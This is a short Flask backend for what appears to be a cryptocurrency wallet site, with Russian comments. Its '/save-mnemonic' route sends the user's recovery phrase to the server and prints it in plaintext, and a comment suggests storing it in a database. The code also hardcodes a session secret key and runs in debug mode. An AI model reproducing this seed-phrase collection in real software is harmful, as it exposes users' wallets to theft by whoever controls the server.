from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__,
            template_folder='C:/Users/User/Desktop/Алишер/Ephedra/code',
            static_folder='C:/Users/User/Desktop/Алишер/Ephedra/static')

# Убедитесь, что у вас есть секретный ключ для работы с сессиями
app.secret_key = 'hjtyu5u5iu57i67k6i6u65y756u7yjkukmukghkghkghkgh'

@app.route('/main')
def main():
    return render_template('wallet.html')

@app.route('/')
def reg():
    # Проверяем, перешел ли пользователь на главную страницу
    if 'visited_main' in session and session['visited_main']:
        return redirect(url_for('main'))  # Перенаправление на главную страницу
    return render_template('reg.html')

@app.route('/save-mnemonic', methods=['POST'])
def save_mnemonic():
    mnemonic = request.form['mnemonic']
    # Здесь вы можете сохранить эту фразу в базу данных или обработать ее
    print(f'Received mnemonic: {mnemonic}')
    session['visited_main'] = True  # Устанавливаем флаг, что пользователь перешел на главную страницу
    return redirect(url_for('main'))

@app.route('/login')
def login():
    return render_template('login.html')  # Новая страница входа

if __name__ == '__main__':
    app.run(debug=True)
